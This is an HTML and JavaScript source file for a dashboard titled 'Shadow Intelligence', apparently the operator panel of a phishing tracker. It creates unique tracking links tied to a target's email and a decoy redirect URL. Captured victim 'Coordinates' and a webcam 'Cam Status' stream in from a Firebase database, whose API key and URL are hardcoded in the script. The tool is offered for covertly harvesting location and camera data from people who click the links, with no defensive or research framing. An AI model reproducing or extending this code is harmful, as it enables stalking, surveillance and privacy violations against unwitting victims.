<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Shadow Intelligence | Link Generator</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        body { background-color: #0f172a; color: #f1f5f9; font-family: 'Inter', sans-serif; }
        .glass-card { background: rgba(30, 41, 59, 0.7); backdrop-filter: blur(10px); border: 1px solid rgba(255,255,255,0.1); border-radius: 1.5rem; }
        .input-box { background: #020617; border: 1px solid #1e293b; padding: 1rem; border-radius: 1rem; color: white; width: 100%; outline: none; transition: 0.3s; }
        .input-box:focus { border-color: #3b82f6; box-shadow: 0 0 15px rgba(59, 130, 246, 0.3); }
        .search-bar { background: #1e293b; border-radius: 12px; padding: 8px 15px; width: 300px; color: white; border: 1px solid #334155; }
    </style>
</head>
<body class="p-4 md:p-10">

    <div class="max-w-6xl mx-auto space-y-8">
        <div class="flex flex-col md:flex-row justify-between items-center gap-4">
            <div>
                <h1 class="text-4xl font-black italic tracking-tighter text-blue-500">SHADOW<span class="text-white">CORE</span></h1>
                <p class="text-[10px] font-bold text-slate-500 uppercase tracking-widest">Advanced Intelligence & Tracking Suite</p>
            </div>
            <input type="text" id="searchInput" onkeyup="searchLogs()" placeholder="Search by Unique ID or Email..." class="search-bar">
        </div>

        <div class="glass-card p-8 space-y-6 shadow-2xl">
            <h2 class="text-xs font-black text-blue-400 uppercase tracking-widest"><i class="fa-solid fa-bolt mr-2"></i> Link Architect</h2>
            <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
                <input type="email" id="targetEmail" placeholder="Enter Receiver Email" class="input-box">
                <input type="text" id="targetRed" placeholder="Redirect URL (e.g. https://google.com)" class="input-box">
            </div>
            <button onclick="generateLink()" class="w-full bg-blue-600 hover:bg-blue-700 p-4 rounded-xl font-black uppercase tracking-widest text-xs transition-all shadow-lg shadow-blue-900/40">Deploy Intelligence Payload</button>
            
            <div id="outputBox" class="hidden animate-pulse border-2 border-dashed border-blue-500/50 p-6 rounded-2xl bg-blue-500/5">
                <p class="text-[10px] font-black text-blue-400 uppercase mb-2">Unique Tracking Link:</p>
                <div class="flex gap-3">
                    <input type="text" id="finalLink" readonly class="w-full bg-black/40 border-none p-3 rounded-lg text-xs font-mono text-green-400">
                    <button onclick="copyLink()" class="bg-blue-500 px-6 py-2 rounded-lg font-bold text-xs uppercase">Copy</button>
                </div>
            </div>
        </div>

        <div class="glass-card overflow-hidden shadow-2xl">
            <div class="p-6 border-b border-slate-700 bg-slate-800/50 flex justify-between">
                <h3 class="text-xs font-black text-slate-400 uppercase">Live Intelligence Transactions</h3>
                <span id="statCount" class="text-blue-400 font-bold text-xs">0 Records Found</span>
            </div>
            <div class="overflow-x-auto">
                <table class="w-full text-left" id="intelTable">
                    <thead class="bg-slate-900/50 text-[10px] font-black text-slate-500 uppercase">
                        <tr>
                            <th class="p-5">Unique ID</th>
                            <th class="p-5">Target Email</th>
                            <th class="p-5">Coordinates</th>
                            <th class="p-5">Cam Status</th>
                            <th class="p-5">Redirect</th>
                            <th class="p-5 text-right">Time</th>
                        </tr>
                    </thead>
                    <tbody id="logList" class="divide-y divide-slate-800 text-xs font-bold"></tbody>
                </table>
            </div>
        </div>
    </div>

    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyAfrFpzw2UddAxGrhAlIeP_c1OaoIG6wNk",
            databaseURL: "https://in-app-update-21c61-default-rtdb.firebaseio.com",
            projectId: "in-app-update-21c61",
        };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();

        function generateLink() {
            const email = document.getElementById('targetEmail').value;
            const red = document.getElementById('targetRed').value;
            if(!email || !red) return alert("All fields are mandatory!");

            const logId = "INTEL-" + Math.floor(100000 + Math.random() * 900000);
            const fullLink = window.location.origin + "/track.html?id=" + logId + "&email=" + email + "&red=" + encodeURIComponent(red);

            document.getElementById('finalLink').value = fullLink;
            document.getElementById('outputBox').classList.remove('hidden');

            db.ref('intelligence_logs/' + logId).set({
                id: logId,
                email: email,
                redirect: red,
                location: "Waiting...",
                camStatus: "Pending (0/6)",
                timestamp: Date.now()
            });
        }

        db.ref('intelligence_logs').on('value', snap => {
            const list = document.getElementById('logList');
            list.innerHTML = "";
            let count = 0;
            snap.forEach(child => {
                const l = child.val();
                count++;
                list.innerHTML = `
                    <tr class="hover:bg-blue-500/5 transition-colors">
                        <td class="p-5 text-blue-400">#${l.id}</td>
                        <td class="p-5 text-slate-300">${l.email}</td>
                        <td class="p-5"><a href="${l.location}" target="_blank" class="text-blue-500 hover:underline">${l.location}</a></td>
                        <td class="p-5"><span class="bg-slate-800 px-3 py-1 rounded text-green-400 text-[10px]">${l.camStatus}</span></td>
                        <td class="p-5 text-slate-500">${l.redirect}</td>
                        <td class="p-5 text-right text-slate-500 font-normal">${new Date(l.timestamp).toLocaleTimeString()}</td>
                    </tr>
                ` + list.innerHTML;
            });
            document.getElementById('statCount').innerText = count + " Records Found";
        });

        function searchLogs() {
            let input = document.getElementById("searchInput").value.toUpperCase();
            let tr = document.getElementById("logList").getElementsByTagName("tr");
            for (let i = 0; i < tr.length; i++) {
                tr[i].style.display = (tr[i].innerText.toUpperCase().indexOf(input) > -1) ? "" : "none";
            }
        }

        function copyLink() {
            const el = document.getElementById('finalLink'); el.select();
            document.execCommand('copy'); alert("Link Copied!");
        }
    </script>
</body>
</html>
